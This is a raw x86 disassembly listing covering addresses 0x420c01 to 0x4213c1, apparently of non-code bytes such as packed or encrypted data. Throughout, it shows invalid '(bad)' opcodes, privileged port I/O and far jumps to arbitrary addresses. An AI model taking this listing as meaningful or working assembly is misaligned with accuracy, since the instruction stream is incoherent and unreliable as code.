  420c01:	lods   al,BYTE PTR ds:[esi]
  420c02:	xor    ebx,edx
  420c04:	test   BYTE PTR [ebx-0x2a],ah
  420c07:	icebp  
  420c08:	leave  
  420c09:	pop    es
  420c0a:	cli    
  420c0b:	add    al,0xbe
  420c0d:	adc    eax,0xdd0374a
  420c12:	xchg   edi,eax
  420c13:	shl    BYTE PTR [edi+esi*4+0x62],0x79
  420c18:	cmp    DWORD PTR [ecx+0x53439d6a],edi
  420c1e:	cmp    ah,bh
  420c20:	out    dx,eax
  420c21:	aad    0xc0
  420c23:	push   cs
  420c24:	jge    0x420c17
  420c26:	mov    edi,0x22eb8bba
  420c2b:	cld    
  420c2c:	cli    
  420c2d:	lods   eax,DWORD PTR ds:[esi]
  420c2e:	push   ss
  420c2f:	mov    bl,0x91
  420c31:	mov    ds:0x96bb1956,al
  420c36:	pop    ds
  420c37:	xor    edi,DWORD PTR [edx]
  420c39:	pushf  
  420c3a:	pop    edx
  420c3b:	jg     0x420c1c
  420c3d:	push   edx
  420c3e:	mov    ds:0x217a675d,eax
  420c43:	push   edx
  420c44:	pop    ebx
  420c45:	es jnp 0x420c5c
  420c48:	add    ebx,DWORD PTR [edx+0x38]
  420c4b:	jmp    0x4ca3aa60
  420c50:	outs   dx,BYTE PTR ds:[esi]
  420c51:	ja     0x420c73
  420c53:	pop    edx
  420c54:	add    eax,0x28361c39
  420c59:	out    dx,al
  420c5a:	test   edi,edx
  420c5c:	icebp  
  420c5d:	push   esp
  420c5e:	(bad)  
  420c5f:	mov    cl,0xb4
  420c61:	repnz push esi
  420c63:	cmp    al,0x93
  420c65:	cmp    al,0x93
  420c67:	mov    DWORD PTR [esi],ecx
  420c69:	popf   
  420c6a:	js     0x420ca8
  420c6c:	in     al,0xc4
  420c6e:	repz fldenv [eax+0x3f]
  420c72:	retf   
  420c73:	xchg   esp,eax
  420c74:	jecxz  0x420c3c
  420c76:	gs popf 
  420c78:	inc    esp
  420c79:	dec    edx
  420c7a:	or     BYTE PTR [edx-0x4a],0xca
  420c7e:	outs   dx,DWORD PTR ds:[esi]
  420c7f:	and    al,0x72
  420c81:	pop    eax
  420c82:	ds dec esp
  420c84:	fdivr  QWORD PTR [edi-0x1a10c6d]
  420c8a:	xlat   BYTE PTR ds:[ebx]
  420c8b:	ins    BYTE PTR es:[edi],dx
  420c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c8d:	ret    0xc2a7
  420c90:	mov    gs,WORD PTR [edi+0x4d56826c]
  420c96:	ret    0x8a2f
  420c99:	jo     0x420c40
  420c9b:	adc    DWORD PTR [ebp-0x6fd4987],esi
  420ca1:	jecxz  0x420c61
  420ca3:	dec    edi
  420ca4:	call   0x2f8122d1
  420ca9:	xor    al,0xac
  420cab:	push   edi
  420cac:	lea    edi,[esp+esi*1]
  420caf:	popa   
  420cb0:	inc    eax
  420cb1:	(bad)  [ebx-0x2a89a022]
  420cb7:	(bad)  [ecx]
  420cb9:	push   0x84a681fa
  420cbe:	bound  ebp,QWORD PTR [ebp+0x5b]
  420cc1:	mov    edi,0x5444e79e
  420cc6:	shl    ebx,1
  420cc8:	repnz ds inc eax
  420ccb:	adc    eax,0x859c391
  420cd0:	int3   
  420cd1:	dec    esi
  420cd2:	stos   BYTE PTR es:[edi],al
  420cd3:	adc    esi,DWORD PTR [eax-0x1a]
  420cd6:	mov    WORD PTR [edx-0x2ebfd3d7],?
  420cdc:	icebp  
  420cdd:	mov    dl,0xb0
  420cdf:	xor    DWORD PTR [edx+0x1197765d],ebx
  420ce5:	sub    dl,bl
  420ce7:	dec    ebp
  420ce8:	cdq    
  420ce9:	cmp    dl,BYTE PTR [eax-0x6]
  420cec:	out    0x44,al
  420cee:	out    dx,al
  420cef:	pop    eax
  420cf0:	push   esp
  420cf1:	popa   
  420cf2:	(bad)  
  420cf3:	imul   ebx
  420cf5:	dec    edx
  420cf6:	imul   eax,esi,0xffffff9c
  420cf9:	cmp    eax,0xe3472427
  420cfe:	or     al,0x7a
  420d00:	in     al,dx
  420d01:	(bad)  
  420d02:	fbstp  TBYTE PTR [ebx+0x30]
  420d05:	adc    ebx,edi
  420d07:	lods   al,BYTE PTR ds:[esi]
  420d08:	xchg   ebx,eax
  420d09:	fcomp  st(3)
  420d0b:	or     al,0x12
  420d0e:	jmp    FWORD PTR [eax-0x44]
  420d11:	mov    ebp,DWORD PTR [eax-0x368cc416]
  420d17:	rcr    DWORD PTR [edx],cl
  420d19:	(bad)  
  420d1a:	xor    DWORD PTR [esi+edi*8-0x5d],eax
  420d1e:	leave  
  420d1f:	ret    
  420d20:	mul    DWORD PTR [eax-0x75]
  420d23:	loop   0x420d6f
  420d25:	inc    ecx
  420d26:	sti    
  420d27:	xchg   BYTE PTR [ebp-0x7f7981f2],ch
  420d2d:	jnp    0x420d0d
  420d2f:	sbb    BYTE PTR [edx],dh
  420d31:	push   0x40
  420d33:	fdivr  DWORD PTR [ebp+ebp*2-0x24]
  420d37:	fcom   QWORD PTR [edi+0x0]
  420d3a:	dec    ecx
  420d3b:	lods   eax,DWORD PTR ds:[esi]
  420d3c:	scas   eax,DWORD PTR es:[edi]
  420d3d:	sbb    al,0xfa
  420d3f:	shr    ch,0xfd
  420d42:	or     BYTE PTR [edi+0x57],0xcc
  420d46:	(bad)  
  420d48:	add    ecx,DWORD PTR ds:0xb9fd3965
  420d4e:	cli    
  420d4f:	ret    0xf820
  420d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d53:	imul   esp,DWORD PTR ds:0x71064af0,0xce0311c1
  420d5d:	fistp  DWORD PTR [edx]
  420d5f:	adc    DWORD PTR ds:0x20da3593,esp
  420d65:	mov    dl,0x65
  420d67:	scas   eax,DWORD PTR es:[edi]
  420d68:	lea    esp,[edi]
  420d6a:	push   ss
  420d6b:	dec    esi
  420d6c:	pop    edx
  420d6d:	nop
  420d6e:	lock add edi,DWORD PTR [esi+0x14a0f28c]
  420d75:	or     BYTE PTR [eax-0x3c],dl
  420d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d79:	xchg   esi,eax
  420d7a:	scas   eax,DWORD PTR es:[edi]
  420d7b:	mov    al,0xdb
  420d7d:	mov    esp,db2
  420d80:	xchg   ebx,eax
  420d81:	xchg   DWORD PTR [esi],eax
  420d83:	inc    ebx
  420d84:	mov    al,0x9d
  420d86:	lock call 0x5b47:0xe75d0053
  420d8e:	rcr    ebp,1
  420d90:	xchg   edx,eax
  420d91:	cmp    eax,0x26f76d77
  420d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d97:	sbb    edx,edi
  420d99:	lock xor dl,BYTE PTR [esi-0x14363d6]
  420da0:	lea    ecx,[edi]
  420da2:	and    al,0x1
  420da4:	cdq    
  420da5:	jle    0x420d88
  420da7:	mov    ch,0xc8
  420da9:	cmp    DWORD PTR [ecx],0xc237bd1c
  420daf:	inc    bl
  420db1:	and    BYTE PTR [edi+0x43],al
  420db4:	pop    es
  420db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420db6:	adc    eax,0xe13219a9
  420dbb:	or     al,0xc
  420dbd:	inc    ebx
  420dbe:	into   
  420dbf:	mov    ebp,DWORD PTR [eax+0x60f8044]
  420dc5:	dec    edi
  420dc6:	cmp    BYTE PTR [ecx-0x3c75755a],bl
  420dcc:	jbe    0x420dc2
  420dce:	jmp    DWORD PTR [ebp-0x6]
  420dd1:	loop   0x420e12
  420dd3:	sub    DWORD PTR [edi],ebx
  420dd5:	ror    bl,1
  420dd7:	cwde   
  420dd8:	cmp    al,0x15
  420dda:	into   
  420ddb:	jle    0x420dae
  420ddd:	xor    BYTE PTR [edx-0x27d6650c],0x55
  420de4:	mov    edx,0x8b2b7940
  420de9:	jmp    0xf6095a2a
  420dee:	cmp    al,0xb6
  420df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420df1:	out    dx,eax
  420df2:	cmp    edx,ecx
  420df4:	mov    eax,ds:0x25ab592e
  420df9:	std    
  420dfa:	popf   
  420dfb:	fdiv   st(4),st
  420dfd:	ins    BYTE PTR es:[edi],dx
  420dfe:	icebp  
  420dff:	or     BYTE PTR [ebp+0x3b],bh
  420e02:	cwde   
  420e03:	pop    es
  420e04:	sub    BYTE PTR [edi],dh
  420e06:	add    eax,0xece6f4c1
  420e0b:	ins    DWORD PTR es:[edi],dx
  420e0c:	sub    eax,0x34254cb1
  420e11:	sbb    dh,ch
  420e13:	inc    ebx
  420e14:	push   ecx
  420e15:	add    eax,0x48dc9b6
  420e1a:	call   0x86a6:0x94be288f
  420e21:	push   edx
  420e22:	js     0x420e72
  420e24:	in     al,0xbd
  420e26:	inc    ebp
  420e27:	in     eax,0xd1
  420e29:	fsub   QWORD PTR [edi-0x4a]
  420e2c:	push   esp
  420e2d:	sahf   
  420e2e:	test   al,ch
  420e30:	jo     0x420e56
  420e32:	inc    eax
  420e33:	arpl   di,dx
  420e35:	and    ebp,esp
  420e37:	mov    ah,BYTE PTR [ecx-0x1d0ffd0]
  420e3d:	add    DWORD PTR [edx+0x44d0766a],0xfffffff4
  420e44:	loope  0x420e07
  420e46:	or     BYTE PTR [eax+0x14],0x68
  420e4a:	into   
  420e4b:	push   ecx
  420e4c:	mov    ebp,0xdeb45068
  420e51:	das    
  420e52:	and    esi,DWORD PTR [eax+ebp*2]
  420e55:	test   DWORD PTR [edx],0xb7b10840
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	mov    ecx,0x8874b3d2
  420e61:	mov    ch,0x33
  420e63:	nop
  420e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e65:	das    
  420e66:	fldcw  WORD PTR [eax-0x57069ea9]
  420e6c:	adc    BYTE PTR [ecx-0x110012bd],0xa9
  420e73:	js     0x420ebb
  420e75:	and    esi,DWORD PTR [ebx]
  420e77:	dec    esp
  420e78:	call   0x3a3f:0xffab0f1e
  420e7f:	cmp    ecx,DWORD PTR ds:0x162ce197
  420e85:	lahf   
  420e86:	scas   eax,DWORD PTR es:[edi]
  420e87:	dec    esp
  420e88:	(bad)  [esi]
  420e8a:	dec    ecx
  420e8b:	loope  0x420ed1
  420e8d:	aad    0xf0
  420e8f:	bound  ebp,QWORD PTR [ecx]
  420e91:	cwde   
  420e92:	cmp    edx,eax
  420e94:	int    0xd1
  420e96:	push   edx
  420e97:	push   esi
  420e98:	push   esi
  420e99:	out    dx,eax
  420e9a:	and    ah,BYTE PTR [edx+0x4f66b24e]
  420ea0:	sub    dh,BYTE PTR [edi+0x17]
  420ea3:	into   
  420ea4:	dec    edi
  420ea5:	push   esi
  420ea6:	dec    esp
  420ea7:	pop    edx
  420ea8:	aas    
  420ea9:	cdq    
  420eaa:	rol    dl,1
  420eac:	loop   0x420e69
  420eae:	pop    es
  420eaf:	sub    esp,0x58d4026e
  420eb5:	add    DWORD PTR [edi],ebx
  420eb7:	retf   
  420eb8:	test   BYTE PTR [eax-0x2661f679],al
  420ebe:	cli    
  420ebf:	xchg   ebp,eax
  420ec0:	sub    ebp,DWORD PTR [edx+0x4d]
  420ec3:	fadd   DWORD PTR [ebx-0x201bb17b]
  420ec9:	je     0x420e94
  420ecb:	add    eax,0xaf3eb7f0
  420ed0:	or     al,0xf
  420ed2:	jl     0x420f0c
  420ed4:	pop    esi
  420ed5:	ss pop edx
  420ed7:	or     ecx,edi
  420ed9:	mov    eax,0xd81df0b8
  420ede:	nop
  420edf:	jg     0x420ec6
  420ee1:	rcr    DWORD PTR [ebp+0x5a257ddb],1
  420ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee8:	sbb    edx,DWORD PTR [ebp+0x38d24494]
  420eee:	adc    eax,0x49990929
  420ef3:	mov    ebp,edi
  420ef5:	add    esi,0x7c
  420ef8:	dec    eax
  420ef9:	std    
  420efa:	push   cs
  420efb:	dec    eax
  420efc:	adc    al,0x6
  420efe:	imul   edi,DWORD PTR [ebp-0x35],0x1db38730
  420f05:	sbb    ah,ah
  420f07:	add    edi,esp
  420f09:	jbe    0x420f61
  420f0b:	fstp   DWORD PTR [edx]
  420f0d:	cmp    eax,0xc069e2f6
  420f12:	(bad)  
  420f13:	jbe    0x420f4e
  420f15:	push   ds
  420f16:	test   BYTE PTR [eax+0x525ac625],0x44
  420f1d:	lea    edi,[edi]
  420f1f:	fidiv  WORD PTR [eax-0x1c]
  420f22:	adc    ecx,ebp
  420f24:	outs   dx,BYTE PTR ds:[esi]
  420f25:	xchg   DWORD PTR [edx],eax
  420f27:	push   0x9f4668f9
  420f2c:	fwait
  420f2d:	repz or dl,BYTE PTR [esi+0x729cf401]
  420f34:	stos   BYTE PTR es:[edi],al
  420f35:	leave  
  420f36:	xor    esp,DWORD PTR ds:0x7799c056
  420f3c:	adc    ah,BYTE PTR [eax]
  420f3e:	fcom   DWORD PTR [eax]
  420f40:	mov    WORD PTR [edx-0x5d9fe27],?
  420f46:	cmp    ch,BYTE PTR [ebx]
  420f48:	in     al,dx
  420f49:	mov    ebp,DWORD PTR [eax]
  420f4b:	jne    0x420f73
  420f4d:	loopne 0x420f78
  420f4f:	add    DWORD PTR [ecx-0x4d],ebp
  420f52:	in     al,0x62
  420f54:	pop    ecx
  420f55:	lahf   
  420f56:	jnp    0x420ed9
  420f58:	call   0x2e36:0xfc9fe4d6
  420f5f:	mov    bl,BYTE PTR [esi+0x33439bdb]
  420f65:	jg     0x420f33
  420f67:	sub    edi,ecx
  420f69:	push   edi
  420f6a:	inc    esp
  420f6b:	pop    eax
  420f6c:	and    cl,ch
  420f6e:	imul   edx,DWORD PTR [esp+edx*2+0x3e],0x99d07aca
  420f76:	sub    DWORD PTR [edx+eiz*2+0x2b8f9960],edx
  420f7d:	fisubr DWORD PTR [edi]
  420f7f:	inc    ecx
  420f80:	mov    cl,0x60
  420f82:	jae    0x420ff9
  420f84:	neg    DWORD PTR [edx+ebx*8-0x58]
  420f88:	fst    DWORD PTR [ebp+0x77afbc61]
  420f8e:	pop    es
  420f8f:	and    edx,ecx
  420f91:	lahf   
  420f92:	aad    0x6e
  420f94:	xor    al,0x4c
  420f96:	out    0xa0,eax
  420f98:	dec    ebp
  420f99:	fldcw  WORD PTR [ebp+0x763c17ad]
  420f9f:	test   BYTE PTR [edi],0x41
  420fa2:	and    cl,cl
  420fa4:	and    BYTE PTR [edx-0x6d],0x15
  420fa8:	sbb    ebx,DWORD PTR [edx+ebp*8-0x44]
  420fac:	jae    0x420fde
  420fae:	out    dx,al
  420faf:	mov    bh,0xc8
  420fb1:	xchg   esi,eax
  420fb2:	mul    BYTE PTR [ebx]
  420fb4:	mov    esi,0xdd2b5558
  420fb9:	pop    es
  420fba:	in     al,dx
  420fbb:	aaa    
  420fbc:	mov    ch,0xfe
  420fbe:	cwde   
  420fbf:	rol    BYTE PTR [ecx+esi*4-0x46f5b819],cl
  420fc6:	push   ds
  420fc7:	aas    
  420fc8:	int3   
  420fc9:	clc    
  420fca:	in     al,0x5f
  420fcc:	ss mov dl,0xa9
  420fcf:	mov    ebp,edx
  420fd1:	pop    ecx
  420fd2:	xlat   BYTE PTR ds:[ebx]
  420fd3:	aad    0x8d
  420fd5:	popa   
  420fd6:	adc    eax,0x7fea851
  420fdb:	daa    
  420fdc:	adc    ebx,eax
  420fde:	inc    ebp
  420fdf:	gs cmp edx,eax
  420fe2:	fcom   DWORD PTR [edi-0x74]
  420fe5:	cs ins DWORD PTR es:[edi],dx
  420fe7:	lods   al,BYTE PTR ds:[esi]
  420fe8:	sbb    al,0xa5
  420fea:	mov    esp,0xef4a24a4
  420fef:	neg    bh
  420ff1:	mov    eax,0x2eb082bf
  420ff6:	mov    eax,0x22754bd8
  420ffb:	test   DWORD PTR [edx],esi
  420ffd:	aas    
  420ffe:	fcmovnu st,st(0)
  421000:	jge    0x42100a
  421002:	sbb    cl,BYTE PTR [ebp-0x5b]
  421005:	jmp    0x7bdc7dfc
  42100a:	add    bh,BYTE PTR [ebx+ebx*8]
  42100d:	popaw  
  42100f:	into   
  421010:	sub    dl,ch
  421012:	mov    eax,0x941d4e4d
  421017:	cwde   
  421018:	outs   dx,DWORD PTR ds:[esi]
  421019:	icebp  
  42101a:	pop    ds
  42101b:	jg     0x420fde
  42101d:	ret    0xefc8
  421020:	push   cs
  421021:	or     al,0xbc
  421023:	lahf   
  421024:	sbb    BYTE PTR [eax],bl
  421026:	sbb    esp,DWORD PTR [esi+0x50dc2449]
  42102c:	mov    ah,BYTE PTR [esi]
  42102e:	enter  0x8524,0x81
  421032:	jae    0x420fcf
  421034:	repnz fisubr WORD PTR [esi-0x70]
  421038:	sbb    edi,edx
  42103a:	in     eax,0x3a
  42103c:	(bad)  
  42103e:	gs gs out 0x8f,eax
  421042:	aad    0x19
  421044:	xchg   BYTE PTR [ecx-0x3f],ah
  421047:	and    eax,0xf7af0fdb
  42104c:	ret    
  42104d:	adc    BYTE PTR [edi-0x66f59471],0x1a
  421054:	sti    
  421055:	inc    ecx
  421056:	iret   
  421057:	retf   0x6c3b
  42105a:	lahf   
  42105b:	pop    eax
  42105c:	jns    0x421010
  42105e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42105f:	mov    eax,esi
  421061:	mov    bh,0x30
  421063:	mov    bl,0xee
  421065:	xchg   esi,eax
  421066:	call   0x76e6:0x85868ea3
  42106d:	sar    DWORD PTR [edi-0x22287da9],0x38
  421074:	mov    ds:0xc579f57e,al
  421079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42107a:	loop   0x421022
  42107c:	dec    ecx
  42107d:	loope  0x421017
  42107f:	adc    BYTE PTR [edi+0x68],bl
  421082:	push   esi
  421083:	sub    al,ah
  421085:	stos   DWORD PTR es:[edi],eax
  421086:	sub    DWORD PTR [ecx+eiz*4-0x3d235abc],ebp
  42108d:	lock or BYTE PTR [ebp+0x41e6a4ab],dl
  421094:	mov    dl,0xea
  421096:	mov    eax,ds:0x1d9151c6
  42109b:	jmp    0xc219f6ef
  4210a0:	(bad)  
  4210a1:	mov    dh,0x91
  4210a3:	lods   eax,DWORD PTR ds:[esi]
  4210a4:	popw   ss
  4210a6:	and    DWORD PTR [ebx+ecx*1-0x4c],eax
  4210aa:	icebp  
  4210ab:	mov    dl,0x71
  4210ad:	(bad)  
  4210ae:	pusha  
  4210af:	ins    BYTE PTR es:[edi],dx
  4210b0:	xchg   esi,eax
  4210b1:	arpl   WORD PTR ss:[ecx],ax
  4210b4:	lahf   
  4210b5:	mov    al,ds:0x8afac93
  4210ba:	push   ds
  4210bb:	cmp    eax,0x83106ff
  4210c0:	int3   
  4210c1:	xchg   edi,eax
  4210c2:	xor    ah,BYTE PTR [esi-0x6e3fab2f]
  4210c8:	jnp    0x4210bc
  4210ca:	popf   
  4210cb:	inc    ecx
  4210cc:	cmp    al,0xd7
  4210ce:	repnz pop edi
  4210d0:	or     DWORD PTR [esi],ebx
  4210d2:	shr    DWORD PTR [edx],1
  4210d4:	jmp    0x4210a8
  4210d6:	cli    
  4210d7:	out    dx,al
  4210d8:	je     0x4210cc
  4210da:	push   cs
  4210db:	xor    al,0xb2
  4210dd:	mov    eax,0xdaad74f1
  4210e2:	test   al,0x5d
  4210e4:	aam    0x57
  4210e6:	(bad)  
  4210e8:	mov    WORD PTR [edx-0x57],ds
  4210eb:	sahf   
  4210ec:	mov    dl,0x7b
  4210ee:	mov    ah,0x7a
  4210f0:	je     0x4210d4
  4210f2:	xor    edx,DWORD PTR [eax-0x1851b676]
  4210f8:	dec    edi
  4210f9:	dec    esi
  4210fa:	(bad)  
  4210fb:	jnp    0x42107e
  4210fd:	dec    edi
  4210fe:	pop    ds
  4210ff:	ins    DWORD PTR es:[edi],dx
  421100:	xor    ebx,ebp
  421102:	cld    
  421103:	xchg   esi,eax
  421104:	mov    eax,0x556446cf
  421109:	repz and dh,BYTE PTR [edx]
  42110c:	pusha  
  42110d:	pop    ss
  42110e:	pop    ds
  42110f:	ins    BYTE PTR es:[edi],dx
  421110:	jo     0x4210d3
  421112:	sbb    eax,0xc4304be
  421117:	leave  
  421118:	fwait
  421119:	adc    BYTE PTR [edx+0x7c],bh
  42111c:	or     DWORD PTR [esi-0x47],esp
  42111f:	ja     0x421154
  421121:	out    dx,al
  421122:	jmp    0xc992b008
  421127:	adc    cl,cl
  421129:	bound  ecx,QWORD PTR [edi+edx*1-0x43]
  42112d:	gs in  al,dx
  42112f:	push   ecx
  421130:	jmp    0x4211aa
  421132:	cs cmp eax,0xd2df9f2b
  421138:	aaa    
  421139:	and    dh,ch
  42113b:	hlt    
  42113c:	push   edx
  42113d:	(bad)  
  42113f:	mov    WORD PTR [edi+0x256443dc],gs
  421145:	xor    dl,dl
  421147:	pop    es
  421148:	stc    
  421149:	add    dl,BYTE PTR [ebx]
  42114b:	adc    eax,ebp
  42114d:	outs   dx,DWORD PTR ds:[esi]
  42114e:	fcom   QWORD PTR [edi-0x13e0e9f]
  421154:	arpl   WORD PTR [ecx],ax
  421156:	jmp    0x421111
  421158:	and    esi,DWORD PTR [edi]
  42115a:	xor    DWORD PTR [ebp-0x4af84c8a],eax
  421160:	cmc    
  421161:	and    BYTE PTR [edx],bh
  421163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421164:	inc    ebx
  421165:	dec    esp
  421166:	inc    esi
  421167:	dec    esi
  421168:	add    DWORD PTR [edi+0x3616a641],esp
  42116e:	sub    al,0xd3
  421170:	adc    BYTE PTR [edx],0xc8
  421173:	test   BYTE PTR [esi],ah
  421175:	push   ebx
  421176:	adc    ecx,DWORD PTR [eax+ebp*1-0x1]
  42117a:	rol    ecx,1
  42117c:	xor    dl,BYTE PTR [ebp-0x4bbffc8b]
  421182:	(bad)  
  421183:	repnz out dx,al
  421185:	jle    0x42116d
  421187:	cmp    bh,0x2d
  42118a:	mov    DWORD PTR [esi+edx*1+0x121da558],ecx
  421191:	imul   edi,edi,0x49
  421194:	pop    esi
  421195:	ficomp DWORD PTR [eax-0x50fdbaa3]
  42119b:	inc    ecx
  42119c:	rcr    bl,1
  42119e:	out    0x3b,al
  4211a0:	mov    DWORD PTR ss:[esi-0x42f11507],eax
  4211a7:	xor    BYTE PTR [ecx-0x72196462],bl
  4211ad:	fist   WORD PTR ds:0x77161f43
  4211b3:	sbb    edi,DWORD PTR [ecx-0x371ee430]
  4211b9:	ffree  st(2)
  4211bb:	arpl   bp,di
  4211bd:	mov    esi,0xb4f29cbe
  4211c2:	js     0x4211a3
  4211c4:	xor    al,0x97
  4211c6:	enter  0x5a81,0x6e
  4211ca:	lahf   
  4211cb:	push   ss
  4211cc:	dec    esi
  4211cd:	mov    gs,WORD PTR [edx-0x70fa9cdd]
  4211d3:	out    dx,eax
  4211d4:	xchg   esp,eax
  4211d5:	add    al,BYTE PTR [esi+0x69fe57d2]
  4211db:	enter  0xde84,0x86
  4211df:	loopne 0x421238
  4211e1:	ja     0x421207
  4211e3:	adc    edx,0x18
  4211e6:	xor    al,0x56
  4211e8:	mov    ebx,0x60e97ec0
  4211ed:	test   eax,0x5817e18c
  4211f2:	push   ebx
  4211f3:	mov    bl,BYTE PTR [edi+0x1322db6]
  4211f9:	dec    edx
  4211fa:	ds add al,0xc2
  4211fd:	xor    eax,0xfcf8882a
  421202:	adc    ebx,DWORD PTR [edi+0x33]
  421205:	in     eax,0x13
  421207:	arpl   WORD PTR [ebp+esi*4+0x31fa952a],sp
  42120e:	sahf   
  42120f:	fsubr  st,st(2)
  421211:	std    
  421212:	push   edx
  421213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421214:	and    dh,BYTE PTR [edx+0xd]
  421217:	mov    esp,0x69a2ed72
  42121c:	jbe    0x4211e4
  42121e:	or     BYTE PTR [ebx-0x3f],dh
  421221:	sahf   
  421222:	test   dl,ah
  421224:	mov    ds:0x1bcc23f,eax
  421229:	call   0xecb2f450
  42122e:	and    DWORD PTR [ebx+eax*2],ecx
  421231:	clc    
  421232:	mov    ebp,0x39eb964
  421237:	sbb    ch,BYTE PTR [edi+0x7b0c5636]
  42123d:	ja     0x42129a
  42123f:	push   ecx
  421240:	dec    ebx
  421241:	dec    edi
  421242:	jo     0x421218
  421244:	sti    
  421245:	repnz sbb BYTE PTR [ecx-0x2a],dh
  421249:	loop   0x42129a
  42124b:	mov    ecx,0x7a4bb819
  421250:	pop    ds
  421251:	inc    ecx
  421252:	enter  0x6bce,0xc5
  421256:	lds    esi,FWORD PTR [ebp+0x4c]
  421259:	in     al,dx
  42125a:	cld    
  42125b:	scas   eax,DWORD PTR es:[edi]
  42125c:	sbb    bh,dl
  42125e:	or     ah,dh
  421260:	lods   al,BYTE PTR ds:[esi]
  421261:	adc    al,0xfe
  421263:	es cs inc ebp
  421266:	call   0x140adecc
  42126b:	push   0xe16e3d59
  421270:	cwde   
  421271:	call   0xf6ab:0x188a3eda
  421278:	sbb    esi,esp
  42127a:	and    eax,DWORD PTR [ebp-0x20]
  42127d:	div    bh
  42127f:	push   esi
  421280:	adc    eax,0x412ad0f8
  421285:	(bad)  
  421286:	and    DWORD PTR [ebx],esi
  421288:	lea    ebp,[eax-0x5f]
  42128b:	fidivr DWORD PTR [edi-0x10]
  42128e:	das    
  42128f:	jmp    0x421261
  421291:	fst    DWORD PTR [edx]
  421293:	pop    ds
  421294:	stos   DWORD PTR es:[edi],eax
  421295:	fidivr DWORD PTR [edx-0x5b]
  421298:	jae    0x4212b7
  42129a:	sub    bh,BYTE PTR [ebx]
  42129c:	addr16 pop edi
  42129e:	int3   
  42129f:	in     eax,dx
  4212a0:	out    0x69,al
  4212a2:	fmul   QWORD PTR ds:[edx+eax*1]
  4212a6:	adc    al,0x83
  4212a8:	mov    al,0x82
  4212aa:	inc    edi
  4212ab:	leave  
  4212ac:	out    dx,al
  4212ad:	cs jo  0x42129e
  4212b0:	aas    
  4212b1:	es xchg ecx,eax
  4212b3:	fcmovnb st,st(6)
  4212b5:	es adc bh,cl
  4212b8:	pop    edi
  4212b9:	mov    edi,0xdc6283e2
  4212be:	int3   
  4212bf:	call   0x4059:0xbcc742a0
  4212c6:	add    al,0xf8
  4212c8:	mov    dh,0x7
  4212ca:	cld    
  4212cb:	test   DWORD PTR [ebp-0xd28e9b6],ebp
  4212d1:	inc    ecx
  4212d2:	es cdq 
  4212d4:	int    0x3
  4212d6:	dec    edx
  4212d7:	popf   
  4212d8:	push   0x40
  4212da:	mov    dl,0xc6
  4212dc:	imul   edx,DWORD PTR [edx-0x66],0x4d1361b0
  4212e3:	dec    ebp
  4212e4:	jge    0x421355
  4212e6:	xor    eax,0x335bfb2f
  4212eb:	and    bl,BYTE PTR [esi+ecx*1]
  4212ee:	jmp    0x590a4e96
  4212f3:	int3   
  4212f4:	pushf  
  4212f5:	mov    edx,0xcfd2b57
  4212fa:	pushf  
  4212fb:	jbe    0x4212c7
  4212fd:	les    ebx,FWORD PTR [ecx-0xfa2264f]
  421303:	in     al,dx
  421304:	adc    ebx,DWORD PTR [eax+0x5b14a5bc]
  42130a:	pushf  
  42130b:	xor    DWORD PTR [esi+0x15d292c4],ebp
  421311:	push   0xbee6ebc8
  421316:	(bad)  
  421317:	clc    
  421318:	popf   
  421319:	mov    ebp,0x54859911
  42131e:	sub    dl,ah
  421320:	dec    ecx
  421321:	(bad)  
  421323:	mul    BYTE PTR ds:0x5f150646
  421329:	sub    BYTE PTR [edi],dh
  42132b:	fldcw  WORD PTR [esi-0xf69ac72]
  421331:	mov    edi,0xdf5e0630
  421336:	sbb    BYTE PTR [ecx+0x5d],dh
  421339:	dec    eax
  42133a:	inc    esi
  42133b:	shr    DWORD PTR [ecx-0x45],0xd7
  42133f:	cmp    BYTE PTR [ebx],dh
  421341:	or     dh,ah
  421343:	data16 jge 0x42132a
  421346:	or     DWORD PTR [esi+esi*4+0x39],edi
  42134a:	(bad)  
  42134b:	fld    TBYTE PTR [ebp+0x59e9e3cd]
  421351:	add    BYTE PTR [edx+0x78380c77],ah
  421357:	xchg   esp,eax
  421358:	jl     0x4213b4
  42135a:	gs push esi
  42135c:	pop    esp
  42135d:	int3   
  42135e:	fnstsw WORD PTR ds:[ecx-0x1b]
  421362:	pusha  
  421363:	ss jmp 0x86d8763d
  421369:	mov    ebp,0xc47ae165
  42136e:	jo     0x421345
  421370:	cdq    
  421371:	jnp    0x421329
  421373:	(bad)  
  421374:	cmp    edx,DWORD PTR [ecx]
  421376:	pop    ebx
  421377:	mov    eax,ds:0x6d1b2c
  42137c:	mov    eax,ds:0xe0d84c31
  421381:	mov    dh,0xd2
  421383:	cmp    esi,edi
  421385:	pop    ds
  421386:	mov    ds:0x5f87170f,al
  42138b:	xor    eax,0xc9743849
  421390:	test   DWORD PTR ds:0x2681b85d,0xa20605fa
  42139a:	xchg   ecx,eax
  42139b:	outs   dx,BYTE PTR ds:[esi]
  42139c:	jl     0x4213c7
  42139e:	inc    edx
  42139f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a0:	adc    ah,cl
  4213a2:	aam    0x5a
  4213a4:	stos   DWORD PTR es:[edi],eax
  4213a5:	ins    BYTE PTR es:[edi],dx
  4213a6:	mov    edx,0x97ca660f
  4213ab:	xchg   esi,eax
  4213ac:	(bad)  
  4213ad:	fstp   TBYTE PTR [edi]
  4213af:	inc    DWORD PTR [ecx+0x8]
  4213b2:	xchg   BYTE PTR [ecx],cl
  4213b4:	lods   al,BYTE PTR ds:[esi]
  4213b5:	lods   eax,DWORD PTR ds:[esi]
  4213b6:	add    eax,0xab843ebb
  4213bb:	out    0x14,eax
  4213bd:	mov    cl,0x9e
  4213bf:	fucompp 
  4213c1:	xor    ch,BYTE PTR [ebx]
